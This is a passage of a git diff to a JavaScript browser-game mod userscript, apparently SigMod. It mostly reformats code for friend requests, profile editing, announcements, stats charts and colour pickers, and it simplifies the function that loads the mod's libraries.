+                            handleAddButtonClick
+                        );
                     }
                 });
             };
@@ -9895,23 +10535,31 @@
                     <div class="friends_row">
                         <div class="centerY g-5">
                             <div class="profile-img">
-                                <img src="${user.imageURL}" alt="${user.username}" onerror="this.onerror=null; this.src='https://czrsd.com/static/sigmod/SigMod25-rounded.png';">
-                                <span class="status_icon ${user.online ? 'online_icon' : 'offline_icon'}"></span>
+                                <img src="${user.imageURL}" alt="${
+                            user.username
+                        }" onerror="this.onerror=null; this.src='https://czrsd.com/static/sigmod/SigMod25-rounded.png';">
+                                <span class="status_icon ${
+                            user.online ? 'online_icon' : 'offline_icon'
+                        }"></span>
                             </div>
                             <div class="f-big">${user.username}</div>
                         </div>
                         <div class="centerY g-10">
                             <div class="${user.role}_role">${user.role}</div>
                             <div class="vr2"></div>
-                            <button class="modButton centerXY accept" data-user-id="${user._id}" style="padding: 6px 7px;">
+                            <button class="modButton centerXY accept" data-user-id="${
+                            user._id
+                        }" style="padding: 6px 7px;">
                                 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" width="16"><path fill="#ffffff" d="M438.6 105.4c12.5 12.5 12.5 32.8 0 45.3l-256 256c-12.5 12.5-32.8 12.5-45.3 0l-128-128c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0L160 338.7 393.4 105.4c12.5-12.5 32.8-12.5 45.3 0z"/></svg>
                             </button>
-                            <button class="modButton centerXY decline" data-user-id="${user._id}" style="padding: 5px 8px;">
+                            <button class="modButton centerXY decline" data-user-id="${
+                            user._id
+                        }" style="padding: 5px 8px;">
                                 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" width="16"><path fill="#ffffff" d="M342.6 150.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L192 210.7 86.6 105.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L146.7 256 41.4 361.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L192 301.3 297.4 406.6c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L237.3 256 342.6 150.6z"/></svg>
                             </button>
                         </div>
                     </div>
-                `,
+                `
                     )
                     .join('');
 
@@ -9925,7 +10573,10 @@
                             headers: {
                                 'Content-Type': 'application/json',
                             },
-                            body: JSON.stringify({ type: 'accept-request', userId }),
+                            body: JSON.stringify({
+                                type: 'accept-request',
+                                userId,
+                            }),
                             credentials: 'include',
                         }).then((res) => res.json());
                         that.openRequests();
@@ -9940,7 +10591,10 @@
                             headers: {
                                 'Content-Type': 'application/json',
                             },
-                            body: JSON.stringify({ type: 'decline-request', userId }),
+                            body: JSON.stringify({
+                                type: 'decline-request',
+                                userId,
+                            }),
                             credentials: 'include',
                         }).then((res) => res.json());
                         that.openRequests();
@@ -9960,41 +10614,65 @@
                 <div class="friends_row">
                     <div class="centerY g-5">
                         <div class="profile-img">
-                            <img src="${this.profile.imageURL}" alt="Profile picture" />
+                            <img src="${
+                this.profile.imageURL
+            }" alt="Profile picture" />
                         </div>
-                        <span class="f-big" id="profile_username_00" title="${this.profile._id}">${this.profile.username}</span>
+                        <span class="f-big" id="profile_username_00" title="${
+                this.profile._id
+            }">${this.profile.username}</span>
                     </div>
                     <button class="modButton-black val" id="editProfile">Edit Profile</button>
                 </div>
                 <div class="friends_row">
                     <span>Status</span>
                     <select class="form-control val" id="edit_static_status">
-                        <option value="online" ${this.friends_settings.static_status === 'online' ? 'selected' : ''}>Online</option>
-                        <option value="offline" ${this.friends_settings.static_status === 'offline' ? 'selected' : ''}>Offline</option>
+                        <option value="online" ${
+                this.friends_settings.static_status === 'online'
+                    ? 'selected'
+                    : ''
+            }>Online</option>
+                        <option value="offline" ${
+                this.friends_settings.static_status === 'offline'
+                    ? 'selected'
+                    : ''
+            }>Offline</option>
                     </select>
                 </div>
                 <div class="friends_row">
                     <span>Accept friend requests</span>
                     <div class="modCheckbox val">
-                        <input type="checkbox" ${this.friends_settings.accept_requests ? 'checked' : ''} id="edit_accept_requests" />
+                        <input type="checkbox" ${
+                this.friends_settings.accept_requests
+                    ? 'checked'
+                    : ''
+            } id="edit_accept_requests" />
                         <label class="cbx" for="edit_accept_requests"></label>
                     </div>
                 </div>
                 <div class="friends_row">
                     <span>Highlight friends</span>
                     <div class="modCheckbox val">
-                        <input type="checkbox" ${this.friends_settings.highlight_friends ? 'checked' : ''} id="edit_highlight_friends" />
+                        <input type="checkbox" ${
+                this.friends_settings.highlight_friends
+                    ? 'checked'
+                    : ''
+            } id="edit_highlight_friends" />
                         <label class="cbx" for="edit_highlight_friends"></label>
                     </div>
                 </div>
                 <div class="friends_row">
                     <span>Highlight color</span>
-                    <input type="color" class="colorInput" value="${this.friends_settings.highlight_color}" style="margin-right: 12px;" id="edit_highlight_color" />
+                    <input type="color" class="colorInput" value="${
+                this.friends_settings.highlight_color
+            }" style="margin-right: 12px;" id="edit_highlight_color" />
                 </div>
                 <div class="friends_row">
                     <span>Public profile</span>
                     <div class="modCheckbox val">
-                        <input type="checkbox" ${this.profile.visible ? 'checked' : ''} id="edit_visible" />
+                        <input type="checkbox" ${
+                this.profile.visible ? 'checked' : ''
+            } id="edit_visible" />
                         <label class="cbx" for="edit_visible"></label>
                     </div>
                 </div>
@@ -10019,7 +10697,8 @@
 
                         const data = await res.json();
 
-                        if (!data.success) return alert('Something went wrong...');
+                        if (!data.success)
+                            return alert('Something went wrong...');
 
                         modSettings.modAccount.authorized = false;
                         updateStorage();
@@ -10057,7 +10736,7 @@
                 debounce(() => {
                     const val = edit_highlight_color.value;
                     updateSettings('highlight_color', val);
-                }, 500),
+                }, 500)
             );
 
             edit_visible.addEventListener('change', () => {
@@ -10104,7 +10783,9 @@
                     <div class="signIn-body" style="width: fit-content;">
                         <div class="centerXY g-10">
                             <div class="profile-img" style="width: 6em;height: 6em;">
-                                <img src="${this.profile.imageURL}" alt="Profile picture" />
+                                <img src="${
+                this.profile.imageURL
+            }" alt="Profile picture" />
                             </div>
                             <div class="f-column g-5">
                                 <input type="file" id="imageUpload" accept="image/*" style="display: none;">
@@ -10120,13 +10801,21 @@
                         </div>
                         <div class="f-column w-100">
                             <label for="username_edit">Username</label>
-                            <input type="text" class="form-control" id="username_edit" value="${this.profile.username}" maxlength="40" minlength="4" />
+                            <input type="text" class="form-control" id="username_edit" value="${
+                this.profile.username
+            }" maxlength="40" minlength="4" />
                         </div>
                         <div class="f-column w-100">
                             <label for="bio_edit">Bio</label>
                             <div class="textarea-container">
-                                <textarea placeholder="Hello! I'm ..." class="form-control" maxlength="250" id="bio_edit">${this.profile.bio || ''}</textarea>
-                                <span class="char-counter" id="charCount">${this.profile.bio ? this.profile.bio.length : '0'}/250</span>
+                                <textarea placeholder="Hello! I'm ..." class="form-control" maxlength="250" id="bio_edit">${
+                this.profile.bio || ''
+            }</textarea>
+                                <span class="char-counter" id="charCount">${
+                this.profile.bio
+                    ? this.profile.bio.length
+                    : '0'
+            }/250</span>
                             </div>
                         </div>
                         <button class="modButton-black" style="margin-bottom: 20px;" id="saveChanges">Save changes</button>
@@ -10184,7 +10873,8 @@
                     ).json();
 
                     if (data.success) {
-                        const profileImg = document.querySelector('.profile-img img');
+                        const profileImg =
+                            document.querySelector('.profile-img img');
                         profileImg.src = data.user.imageURL;
                         hide();
                         that.profile = data.user;
@@ -10231,7 +10921,8 @@
                 if (resData.success) {
                     if (that.profile.username !== resData.user.username) {
                         const p_username = byId('profile_username_00');
-                        if (p_username) p_username.innerText = resData.user.username;
+                        if (p_username)
+                            p_username.innerText = resData.user.username;
                     }
                     that.profile = resData.user;
                     changes.clear();
@@ -10252,7 +10943,7 @@
             deleteAvatar.addEventListener('click', async () => {
                 if (
                     confirm(
-                        'Are you sure you want to remove your profile picture? It will be changed to the default profile picture.',
+                        'Are you sure you want to remove your profile picture? It will be changed to the default profile picture.'
                     )
                 ) {
                     try {
@@ -10261,12 +10952,13 @@
                                 credentials: 'include',
                             })
                         ).json();
-                        const profileImg = document.querySelector('.profile-img img');
+                        const profileImg =
+                            document.querySelector('.profile-img img');
                         profileImg.src = data.user.imageURL;
                         hide();
                         that.profile = data.user;
                     } catch (error) {
-                        console.error('Couldn\'t remove image: ', error);
+                        console.error("Couldn't remove image: ", error);
                         this.modAlert(error.message, 'danger');
                     }
                 }
@@ -10284,14 +10976,18 @@
             const { data } = announcements;
 
             const pinnedAnnouncements = data.filter(
-                (announcement) => announcement.pinned,
+                (announcement) => announcement.pinned
             );
             const unpinnedAnnouncements = data.filter(
-                (announcement) => !announcement.pinned,
+                (announcement) => !announcement.pinned
             );
 
-            pinnedAnnouncements.sort((a, b) => new Date(b.date) - new Date(a.date));
-            unpinnedAnnouncements.sort((a, b) => new Date(b.date) - new Date(a.date));
+            pinnedAnnouncements.sort(
+                (a, b) => new Date(b.date) - new Date(a.date)
+            );
+            unpinnedAnnouncements.sort(
+                (a, b) => new Date(b.date) - new Date(a.date)
+            );
 
             const sortedAnnouncements = [
                 ...pinnedAnnouncements,
@@ -10302,14 +10998,20 @@
                 .map(
                     (announcement) => `
 				<div class="mod-announcement" data-announcement-id="${announcement._id}">
-					<img class="mod-announcement-icon" src="${announcement.icon}" width="32" draggable="false" />
+					<img class="mod-announcement-icon" src="${
+                        announcement.icon
+                    }" width="32" draggable="false" />
 					<div class="mod-announcement-text">
 						<span>${announcement.title}</span>
 						<div>${announcement.description}</div>
 					</div>
-					${announcement.pinned ? '<img src="https://czrsd.com/static/icons/pinned.svg" draggable="false" style="width: 22px; align-self: start;" />' : ''}
+					${
+                        announcement.pinned
+                            ? '<img src="https://czrsd.com/static/icons/pinned.svg" draggable="false" style="width: 22px; align-self: start;" />'
+                            : ''
+                    }
 				</div>
-			`,
+			`
                 )
                 .join('');
 
@@ -10319,16 +11021,23 @@
                 document.querySelectorAll('.mod-announcement');
             announcementElements.forEach((element) => {
                 element.addEventListener('click', async (event) => {
-                    const announcementId = element.getAttribute('data-announcement-id');
+                    const announcementId = element.getAttribute(
+                        'data-announcement-id'
+                    );
                     try {
                         const data = await (
-                            await fetch(this.appRoutes.announcement(announcementId))
+                            await fetch(
+                                this.appRoutes.announcement(announcementId)
+                            )
                         ).json();
                         if (data.success) {
                             createAnnouncementTab(data.data);
                         }
                     } catch (error) {
-                        console.error('Error fetching announcement details:', error);
+                        console.error(
+                            'Error fetching announcement details:',
+                            error
+                        );
                     }
                 });
             });
@@ -10346,7 +11055,9 @@
                 const announcementHTML = `
 					<div class="centerY justify-sb">
 						<div class="centerY g-5">
-							<img style="border-radius: 50%;" src="${data.preview.icon}" width="64" draggable="false" />
+							<img style="border-radius: 50%;" src="${
+                    data.preview.icon
+                }" width="64" draggable="false" />
 							<div class="f-column centerX">
 								<h2>${data.full.title}</h2>
 								<span style="color: #7E7E7E">${prettyTime.fullDate(data.date)}</span>
@@ -10357,7 +11068,12 @@
 					<div class="mod-announcement-content">
 						<div class="f-column g-10 scroll">${data.full.description}</div>
 						<div class="mod-announcement-images scroll">
-							${data.full.images.map((image) => `<img src="${image}" onclick="window.open('${image}')" />`).join('')}
+							${data.full.images
+                    .map(
+                        (image) =>
+                            `<img src="${image}" onclick="window.open('${image}')" />`
+                    )
+                    .join('')}
 						</div>
 					</div>
 				`;
@@ -10393,20 +11109,21 @@
             // max values
             const statValues = {
                 timeplayed: [
-                    10_000, 50_000, 100_000, 150_000, 200_000, 250_000, 300_000, 400_000,
-                    800_000, 1_000_000,
+                    10_000, 50_000, 100_000, 150_000, 200_000, 250_000, 300_000,
+                    400_000, 800_000, 1_000_000,
                 ],
                 highestmass: [
-                    50_000, 100_000, 500_000, 700_000, 1_000_000, 5_000_000, 10_000_000,
+                    50_000, 100_000, 500_000, 700_000, 1_000_000, 5_000_000,
+                    10_000_000,
                 ],
                 totaldeaths: [
-                    100, 500, 1_000, 2_000, 3_000, 4_000, 5_000, 8_000, 10_000, 30_000,
-                    50_000, 100_000,
+                    100, 500, 1_000, 2_000, 3_000, 4_000, 5_000, 8_000, 10_000,
+                    30_000, 50_000, 100_000,
                 ],
                 totalmass: [
-                    100_000, 500_000, 1_000_000, 2_000_000, 3_000_000, 5_000_000,
-                    10_000_000, 50_000_000, 100_000_000, 500_000_000, 1_000_000_000,
-                    2_000_000_000, 5_000_000_000,
+                    100_000, 500_000, 1_000_000, 2_000_000, 3_000_000,
+                    5_000_000, 10_000_000, 50_000_000, 100_000_000, 500_000_000,
+                    1_000_000_000, 2_000_000_000, 5_000_000_000,
                 ],
             };
 
@@ -10432,13 +11149,25 @@
                         label: 'Your Stats',
                         data: [
                             stats['time-played'] /
-                            getBestValue(stats['time-played'], statValues.timeplayed),
+                            getBestValue(
+                                stats['time-played'],
+                                statValues.timeplayed
+                            ),
                             stats['highest-mass'] /
-                            getBestValue(stats['highest-mass'], statValues.highestmass),
+                            getBestValue(
+                                stats['highest-mass'],
+                                statValues.highestmass
+                            ),
                             stats['total-deaths'] /
-                            getBestValue(stats['total-deaths'], statValues.totaldeaths),
+                            getBestValue(
+                                stats['total-deaths'],
+                                statValues.totaldeaths
+                            ),
                             stats['total-mass'] /
-                            getBestValue(stats['total-mass'], statValues.totalmass),
+                            getBestValue(
+                                stats['total-mass'],
+                                statValues.totalmass
+                            ),
                         ],
                         backgroundColor: [
                             'rgba(255, 99, 132, 0.2)',
@@ -10462,7 +11191,10 @@
                     const hours = Math.floor(actualValue / 3600);
                     const minutes = Math.floor((actualValue % 3600) / 60);
                     return hours > 0 ? `${hours}h ${minutes}m` : `${minutes}m`;
-                } else if (labelType === 'Highest Mass' || labelType === 'Total Mass') {
+                } else if (
+                    labelType === 'Highest Mass' ||
+                    labelType === 'Total Mass'
+                ) {
                     return actualValue > 999
                         ? `${(actualValue / 1000).toFixed(1)}k`
                         : actualValue.toString();
@@ -10483,7 +11215,8 @@
                                     beginAtZero: true,
                                     max: 1,
                                     ticks: {
-                                        callback: (value) => `${(value * 100).toFixed(0)}%`,
+                                        callback: (value) =>
+                                            `${(value * 100).toFixed(0)}%`,
                                     },
                                 },
                             },
@@ -10493,17 +11226,32 @@
                                 },
                                 tooltip: {
                                     callbacks: {
-                                        title: (context) => textLabels[context[0].dataIndex],
+                                        title: (context) =>
+                                            textLabels[context[0].dataIndex],
                                         label: (context) => {
                                             const dataIndex = context.dataIndex;
-                                            const labelType = textLabels[dataIndex];
+                                            const labelType =
+                                                textLabels[dataIndex];
                                             const actualValue =
-                                                context.dataset.data[dataIndex] *
+                                                context.dataset.data[
+                                                    dataIndex
+                                                    ] *
                                                 getBestValue(
-                                                    stats[labelType.toLowerCase().replace(' ', '-')],
-                                                    statValues[labelType.toLowerCase().replace(' ', '')],
+                                                    stats[
+                                                        labelType
+                                                            .toLowerCase()
+                                                            .replace(' ', '-')
+                                                        ],
+                                                    statValues[
+                                                        labelType
+                                                            .toLowerCase()
+                                                            .replace(' ', '')
+                                                        ]
                                                 );
-                                            return formatLabel(labelType, actualValue);
+                                            return formatLabel(
+                                                labelType,
+                                                actualValue
+                                            );
                                         },
                                     },
                                 },
@@ -10511,7 +11259,10 @@
                         },
                     });
                 } catch (error) {
-                    console.error('An error occurred while rendering the chart:', error);
+                    console.error(
+                        'An error occurred while rendering the chart:',
+                        error
+                    );
                 }
             };
 
@@ -10568,21 +11319,30 @@
                     opacity: true,
                     color: modSettings.chat.bgColor,
                     default: defaultSettings.chat.bgColor,
-                    elementTarget: { selector: '.modChat', property: 'background' },
+                    elementTarget: {
+                        selector: '.modChat',
+                        property: 'background',
+                    },
                 },
                 chatTextColor: {
                     path: 'chat.textColor',
                     opacity: true,
                     color: modSettings.chat.textColor,
                     default: defaultSettings.chat.textColor,
-                    elementTarget: { selector: '.chatMessage-text', property: 'color' },
+                    elementTarget: {
+                        selector: '.chatMessage-text',
+                        property: 'color',
+                    },
                 },
                 chatThemeChanger: {
                     path: 'chat.themeColor',
                     opacity: true,
                     color: modSettings.chat.themeColor,
                     default: defaultSettings.chat.themeColor,
-                    elementTarget: { selector: '.chatButton', property: 'background' },
+                    elementTarget: {
+                        selector: '.chatButton',
+                        property: 'background',
+                    },
                 },
             };
 
@@ -10591,7 +11351,13 @@
             Object.entries(colorPickerConfig).forEach(
                 ([
                      selector,
-                     { path, opacity, color, default: defaultColor, elementTarget },
+                     {
+                         path,
+                         opacity,
+                         color,
+                         default: defaultColor,
+                         elementTarget,
+                     },
                  ]) => {
                     const storagePath = path.split('.');
                     const colorPickerInstance = new Alwan(`#${selector}`, {
@@ -10612,14 +11378,17 @@
                                 <span>Reset Color</span>
                                 <button class="resetButton" id="reset-${selector}"></button>
                             </div>
-                        `,
+                        `
                     );
 
                     colorPickerInstance.on('change', (e) => {
                         let storageElement = modSettings;
                         storagePath
                             .slice(0, -1)
-                            .forEach((part) => (storageElement = storageElement[part]));
+                            .forEach(
+                                (part) =>
+                                    (storageElement = storageElement[part])
+                            );
                         storageElement[storagePath.at(-1)] = e.hex;
 
                         if (
@@ -10630,7 +11399,9 @@
                         }
 
                         if (elementTarget) {
-                            const targets = document.querySelectorAll(elementTarget.selector);
+                            const targets = document.querySelectorAll(
+                                elementTarget.selector
+                            );
 
                             targets.forEach((target) => {
                                 target.style[elementTarget.property] = e.hex;
@@ -10646,7 +11417,10 @@
                         let storageElement = modSettings;
                         storagePath
                             .slice(0, -1)
-                            .forEach((part) => (storageElement = storageElement[part]));
+                            .forEach(
+                                (part) =>
+                                    (storageElement = storageElement[part])
+                            );
                         storageElement[storagePath.at(-1)] = defaultColor;
 
                         if (
@@ -10658,74 +11432,56 @@
                         }
 
                         if (elementTarget) {
-                            const targets = document.querySelectorAll(elementTarget.selector);
+                            const targets = document.querySelectorAll(
+                                elementTarget.selector
+                            );
 
                             targets.forEach((target) => {
-                                target.style[elementTarget.property] = defaultColor;
+                                target.style[elementTarget.property] =
+                                    defaultColor;
                             });
                         }
 
                         updateStorage();
                     });
-                },
+                }
             );
         },
 
         async loadLibraries() {
-            for (const lib in libs) {
-                const { url, css, module } = libs[lib];
-                const startTime = performance.now();
+            const loadScript = (src) =>
+                new Promise((resolve, reject) => {
+                    const script = document.createElement('script');
+                    script.src = src;
+                    script.type = 'text/javascript';
+                    document.head.appendChild(script);
 
-                if (module) {
-                    // Handle ES modules using import
-                    const library = await import(url);
-                    console.log(`%c✅ Loaded ${lib}.`, 'color: lime');
+                    script.onload = () => resolve();
+                    script.onerror = (error) => reject(error);
+                });
+
+            const loadCSS = (href) =>
+                new Promise((resolve, reject) => {
+                    const link = document.createElement('link');
+                    link.rel = 'stylesheet';
+                    link.href = href;
+                    document.head.appendChild(link);
+
+                    link.onload = () => resolve();
+                    link.onerror = (error) => reject(error);
+                });
+
+            for (const [lib, val] of Object.entries(libs)) {
+                if (typeof val === 'string') {
+                    await loadScript(val);
                 } else {
-                    // Handle CommonJS modules using script tag
-                    await new Promise((resolve, reject) => {
-                        const script = document.createElement('script');
-                        script.src = url;
-                        script.type = 'text/javascript';
-                        document.head.appendChild(script);
-
-                        script.onload = () => {
-                            console.log(`%c✅ Loaded ${lib}.`, 'color: lime');
-                            resolve();
-                        };
-                        script.onerror = (error) => reject(error);
-                    });
+                    await loadScript(val.js);
+                    if (val.css) await loadCSS(val.css);
                 }
 
-                const downloadTime = performance.now() - startTime;
-                console.log(`⏬ Download time: ${downloadTime.toFixed(2)}ms`);
+                console.log(`%c✅ Loaded ${lib}.`, 'color: lime');
 
-                if (typeof this[lib] === 'function') {
-                    this[lib]();
-                }
-
-                if (css) {
-                    const cssStartTime = performance.now();
-
-                    await Promise.all(
-                        css.map(
-                            (cssUrl) =>
-                                new Promise((resolve, reject) => {
-                                    const link = document.createElement('link');
-                                    link.rel = 'stylesheet';
-                                    link.href = cssUrl;
-                                    document.head.appendChild(link);
-
-                                    link.onload = () => resolve();
-                                    link.onerror = (error) => reject(error);
-                                }),
-                        ),
-                    );
-                    const cssDownloadTime = performance.now() - cssStartTime;
-                    console.log(
-                        `%c✅ Loaded CSS for ${lib}. ⏬ Download time: ${cssDownloadTime.toFixed(2)}ms`,
-                        'color: #40D476',
-                    );
-                }
+                if (typeof this[lib] === 'function') this[lib]();
             }
         },
 
@@ -10735,8 +11491,7 @@
                 return;
             }
             // only initialize sigmod on the main page
-            if (!document.querySelector('.body__inner'))
-                return;
+            if (!document.querySelector('.body__inner')) return;
 
             new SigWsHandler();
 
@@ -10747,7 +11502,7 @@
                 this.chat();
                 this.macros();
                 this.tagsystem();
-                this.updateNick();
+                this.handleNick();
                 this.clientPing();
                 this.themes();
                 this.createMinimap();
@@ -10765,5 +11520,5 @@
         },
     };
 
-    mods = new mod();
+    mods = new Mod();
 })();
